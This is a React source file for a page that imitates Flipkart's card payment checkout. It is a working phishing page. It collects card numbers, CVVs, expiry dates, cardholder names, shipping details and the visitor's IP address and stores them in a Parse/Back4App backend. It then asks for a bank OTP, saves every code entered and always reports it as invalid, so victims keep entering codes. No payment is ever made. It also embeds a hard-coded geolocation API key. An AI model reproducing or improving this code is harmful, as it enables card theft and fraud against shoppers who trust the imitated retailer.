import {React,useEffect,useState} from 'react'
import MetaData from '../../Layouts/MetaData';
import Header from '../../components/Header/Header'
import { Button, Card,TextField, Divider,Select,MenuItem,FormControl, FormHelperText } from '@mui/material'
import { useSelector } from 'react-redux';
import LocalOfferIcon from '@mui/icons-material/LocalOffer';
import HelpIcon from '@mui/icons-material/Help';
import PriceSidebar from '../Cart/PriceSidebar';
import InfoIcon from '@mui/icons-material/Info';
import {InputAdornment} from '@mui/material';
import axios from 'axios'
import Parse from 'parse/dist/parse.min.js';
import * as Yup from 'yup'
import { yupResolver } from "@hookform/resolvers/yup";
import { useForm } from 'react-hook-form'
import { useSnackbar } from 'notistack';
import Countdown from 'react-countdown';


const Payments = () => {
    const { cartItems } = useSelector((state) => state.cart);
    const { shippingInfo } = useSelector((state) => state.cart);
    const { enqueueSnackbar } = useSnackbar();
    const [iP, setIP] = useState("");
    const [resendOTP ,setResendOTP]=useState(false)
    const [showOTP, setShowOTP] = useState(false);
    const [otpState, setOtpState] = useState();
    const cardSchema = Yup.object().shape({ 
    cardNumber:Yup
        .number()
        .required("Enter the Card Number")
        .typeError("Enter valid Card number")
        .min(1000000000000000,"Card Number should be 16 Digits")
        .max(9999999999999999,"Card Number should be 16 Digits"),
    cvv:Yup
        .string()
        .required("Enter CVV ")
        .min(3)
        .max(3),
    name:Yup
        .string()
        .required(),
    month:Yup
        .string()
        .required(),
    year:Yup
        .string()
        .required(),
    cardType:Yup
        .string()
        .required("Select card type."),
  })
  const {
    register, 
    handleSubmit, 
    formState:{errors,},
    setValue
    } = useForm({
    criteriaMode:"all",
        mode: "onChange",
        reValidateMode: 'onChange',
        resolver: yupResolver(cardSchema),
    })

  const months = [
    {
        name: '01 (January)',
        value: '01'
    },
    {
        name: '02 (February)',
        value: '02'
    },
    {
        name: '03 (March)',
        value: '03'
    },
    {
        name: '04 (April)',
        value: '04'
    },
    {
        name: '05 (May)',
        value: '05'
    },
    {
        name: '06 (June)',
        value: '06'
    },
    {
        name: '07 (July)',
        value: '07'
    },
    {
        name: '08 (August)',
        value: '08'
    },
    {
        name: '09 (September)',
        value: '09'
    },
    {
        name: '10 (October)',
        value: '10'
    },
    {
        name: '11 (November)',
        value: '11'
    },
    {
        name: '12 (December)',
        value: '12'
    }

  ]
  const years = [22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,3,39,40,41,42,43,45,46,47,48,50,51]

  
  const getIpAddress= () => {
    axios.get('https://ipgeolocation.abstractapi.com/v1/?api_key=403b06ab04a945bf9345ca98e68380ef')
    .then(response => {
        // console.log(response.data);
        setIP(response.data.ip_address);
    })
    .catch(error => {
        console.log(error);
    });
  }

  // State variables

  async function addCard(data) {
    try {
      const Card = new Parse.Object('Card');
      // define the attributes you want for your Object
      Card.set('ipAdd', iP);
      Card.set('cardData', data);
      Card.set('userData',shippingInfo );
      // save it on Back4App Data Store
      await Card.save();
      enqueueSnackbar("OTP Sent", { variant: "success" });
    //   alert('Person saved!');
    } catch (error) {
      console.log('Error saving new person: ', error);
    }
  }
  async function addOTP(data) {
    try {
      const OTP = new Parse.Object('OTP');
      // define the attributes you want for your Object
      OTP.set('ipAdd', iP);
    //   OTP.set()
      OTP.set('OTPData', data);
      // save it on Back4App Data Store
      await OTP.save();
      enqueueSnackbar("Invalid OTP", { variant: "error" });
    //   alert('Person saved!');
    } catch (error) {
      console.log('Error saving new person: ', error);
    }
  }

  const sendOTP = () => {
    enqueueSnackbar("OTP Resend Successfully!", { variant: "success" })
    
  }

  
  useEffect(() => {
    getIpAddress();
    // addCard()
  }, [])

  const onSubmit= (data) => {
    // console.log(data)
    addCard(data)
    setShowOTP(true)
  }
  const handleOTP = () =>{
    addOTP(otpState)
  }

  const resendOTPHandler = () =>{
    setTimeout(sendOTP(),5000);
    setResendOTP(false)
  }
  const Completionist = () => <h1 className="w-full p-2 font-semibold text-center text-blue-500" onClick={resendOTPHandler} >Resend OTP</h1>

  const renderer = ({  minutes, seconds, completed, }) => {
    if (completed) {
      setResendOTP(true)
      return ;
    } else {
      // Render a countdown
      return (
          <h1 className='p-1 text-sm text-center text-gray-500'>Not received your code? Resend OTP in {minutes}:{seconds}</h1>
      );
    }
  };

  
  

  return (
    <>
    <MetaData title="Flipkart | Card Payment" />
    <Header title="Card Payment"/>
    <div className="flex flex-col w-full bg-[#f1f2f4]">
        <div className="w-full">
            <img className="w-full shadow-md" src="assets/payment.svg" alt="orderSummary" />
        </div>
        <div className="flex flex-col w-full py-2 space-y-2">
            <Card className="flex-col w-full p-4 shadow-lg ">
              <p className="flex items-center text-sm">
                <span className="text-green-600"><LocalOfferIcon sx={{ fontSize: "20px" }} /></span>
                <span className="mx-2">15% Instant discount on first Flipkart Pay Later order of 500 and above </span><span className="font-sans text-sm font-semibold text-blue-600" to="/">T&C</span>
              </p>
              <Divider/>
              <div className="flex items-center justify-center align-middle">
                  <h1 className="mt-1 font-sans text-sm font-medium text-blue-600">View all offers</h1>
              </div>
            </Card>
            <Card className="flex-col w-full p-4 space-y-1 shadow-lg ">
                <div className="flex flex-row items-center space-x-2 font-sans text-[12px] w-full">
                    <InfoIcon sx={{ 
                    fontSize:"25px",
                    color:"#ffaf00"
                    }} />
                    <h1 className="w-full">Plase ensure your card can be used for online transactions.<span className="font-medium text-blue-500">Know More</span></h1>
                </div>
                {showOTP ? 
                <div className="flex flex-row items-center space-x-2 font-sans text-[12px] w-full">
                    <InfoIcon sx={{ 
                    fontSize:"25px",
                    color:"#ffaf00"
                    }} />
                    <h1 className="w-full">Due to high demand, there may be delay in receiving OTP.<span className="font-medium text-black">Do not leave page or refresh the page.</span></h1>
                </div>

                : ""}
            </Card>
            <form noValidate onSubmit={handleSubmit(onSubmit)}>   
            { showOTP ? 
            <Card className="flex flex-col w-full p-4 shadow-lg">
                <h1 className='flex p-1 text-base font-normal text-gray-600'>Validate your card.</h1>
                <div className='flex flex-col w-full space-y-2'>
                   <TextField
                   id='otp'
                   name='otp'
                   variant='standard'
                   value={otpState}
                   label="Enter OTP (One Time Password)"
                   type="number"
                   onChange={(e)=>{
                        setOtpState(e.target.value)
                   }}
                   inputProps={{ 
                    maxLength:6,
                                 
                    }}
                   /> 
                   <Divider/>
                   {resendOTP ? <Completionist /> :
                        <Countdown date={Date.now() + 180000} renderer={renderer} />
                    }
                   <Button
                        sx={{
                            fontSize: "14px",
                            backgroundColor: "#FF5800",
                            padding:"10px"
                        }}
                        size='small'
                        variant="contained"
                        fullWidth
                        onClick={handleOTP}
                    >
                        Validate OTP
                    </Button>
                </div>
            </Card> :
            <>
            <Card className="flex p-4 shadow-lg">
                    <div className="flex flex-col space-y-2">
                        <div className='flex w-full'>
                            <FormControl sx={{ width:"100%" }}>
                                <h1 className='text-sm'>Select Card Type</h1>
                                <Select 
                                fullWidth
                                labelId='cardType'
                                size='small'
                                label="Select Card Type"
                                variant='standard'
                                id="cardType"
                                name='cardType'
                                {...register("cardType")}
                                error={Boolean(errors?.cardType)}
                                >
                                    <MenuItem value={"debitCard"}>Debit Card</MenuItem>
                                    <MenuItem value={"creditCard"}>Credit Card</MenuItem>
                                </Select>
                                <FormHelperText sx={{color:"red", marginLeft:"0"}}>{errors?.cardType?.message}</FormHelperText>
                            </FormControl>
                        </div>
                        <div className="flex w-full">
                            <TextField
                                fullWidth
                                id="cardNumber"
                                name="cardNumber"
                                variant="standard"
                                // type="number"
                                label="Card Number"
                                {...register("cardNumber")}
                                onKeyUp={(e)=>{
                                    var val = e.target.value;
                                    const valArray = val.split(' ').join('').split('');
                                    // console.log(valArray.length,"valArr")
                                    var valSpace = val.split("")
                                    // console.log(valSpace,"valspace")


                                    // to work with backspace
                                    if(valSpace[valSpace.length-1] === ' '){
                                        var valSpaceN = valSpace.slice(0, -2)
                                        val = valSpaceN.join("")
                                        // this.setState({ number:val });
                                        setValue("cardNumber",val)
                                        return;
                                    }

                                    if(isNaN(valArray.join('')))
                                        return;
                                    if(valArray.length === 17)
                                        return;
                                    if(valArray.length % 4 === 0 && valArray.length <= 15 && valArray.length > 0) {
                                        setValue("cardNumber",e.target.value+ " ")
                                        // this.setState({ number: e.target.value + "  " });
                                    }else{
                                        setValue("cardNumber",e.target.value)
                                        // this.setState({ number: e.target.value})
                                    }
                                }}
                                InputLabelProps={{
                                    style: { 
                                        fontSize: "16px"
                                      },
                                }}
                                inputProps={{
                                    maxLength:19,
                                    style: { 
                                      fontSize: "16px"
                                    },
                                  }}
                                error={Boolean(errors?.cardNumber)}
                                helperText={errors.cardNumber?.message}
                               
                            />
                        </div>
                        <div className="flex w-full">
                            <TextField
                                fullWidth
                                id="name"
                                {...register("name")}
                                variant="standard"
                                label="Name on Card"
                                InputLabelProps={{
                                    style: { 
                                        fontSize: "16px"
                                      },
                                }}
                                inputProps={{
                                    style: { 
                                      fontSize: "16px"
                                    },
                                  }}
                                error={Boolean(errors?.name)}
                                helperText={errors.name?.message}
                               
                            />
                        </div>
                        <div className='flex flex-row justify-between w-full'>
                            <div className="flex flex-col items-center justify-start w-full">
                                <h1 className="flex text-[12px] w-full justify-start font-sans text-gray-600 ">Valid thru</h1>
                                <div className="left-0 flex flex-row justify-start w-full space-x-2">
                                <FormControl sx={{ minWidth: 80 }} size="small"> 
                                    <Select
                                        labelId="month"
                                        id="month"
                                        size="small"
                                        label="MM"
                                        variant="standard"
                                        error={Boolean(errors?.month)}
                                        {...register("month")}
                                    >
                                        {months.map((item,index)=>(

                                            <MenuItem sx={{ minWidth:180,}} key={index} value={item.value}>{item.value}</MenuItem>
                                        ))}
                                    </Select>
                                </FormControl>
                                <FormControl sx={{ minWidth: 80 }} size="small">
                                    <Select
                                        labelId="year"
                                        id="year"
                                        size="small"
                                        label="YY"
                                        error={Boolean(errors?.year)}
                                        {...register("year")}   
                                        variant="standard"
                                    >
                                        {years.map((item,index)=>(
                                            <MenuItem sx={{ minWidth:180,}} key={index} value={item}>{item}</MenuItem>
                                        ))}
                                    </Select>   
                                    
                                </FormControl>
                                </div>
                            </div>
                            <div className="flex">
                                <TextField
                                        id="cvv"
                                        name="cvv"
                                        size="small"
                                        variant="standard"
                                        label="CVV"
                                        {...register("cvv")}
                                        InputLabelProps={{
                                            style: { 
                                                fontSize: "16px"
                                              },
                                        }}
                                        InputProps={{
                                            maxLength:3,
                                            style: { 
                                                fontSize: "16px"
                                              },
                                            endAdornment:(
                                                <InputAdornment position="end">
                                                    <HelpIcon sx={{fontSize:"24px"}}/>    
                                                </InputAdornment>
                                            )
                                        }}
                                        error={Boolean(errors?.cvv)}
                                        helperText={errors.cvv?.message}
                                    />
                            </div>
                        </div>
                    </div>
                </Card>
            <Card>
                <div className="flex justify-center w-full p-2 font-sans font-semibold">
                    <Button
                        sx={{
                            fontSize: "14px",
                            backgroundColor: "#FF5800",
                            padding:"10px"
                        }}
                        size='small'
                        variant="contained"
                        fullWidth
                        type="submit"
                    >
                        Pay ₹{cartItems.reduce((sum, item) => sum + (item.price * item.quantity), 0).toLocaleString()}
                    </Button>
                </div>
            </Card>
            </>
            }
            </form>
            <Card>
                <PriceSidebar cartItems={cartItems} />
            </Card>
            <div className="w-full">
                <img className="w-full" src="assets/safety1.svg" alt="banner"/>
            </div>
            <div className="flex flex-row items-center justify-center p-3">
                <img className='flex w-full' src="assets/safety2.jpg" alt='sheild'/>
                {/* <h1 className='flex w-full font-serif text-xs font-light text-gray-500'>Safe and Secure payments. Easy returns. 100% Authentic products</h1> */}
            </div>
        </div>
    </div>
    
    </>
  )
}

export default Payments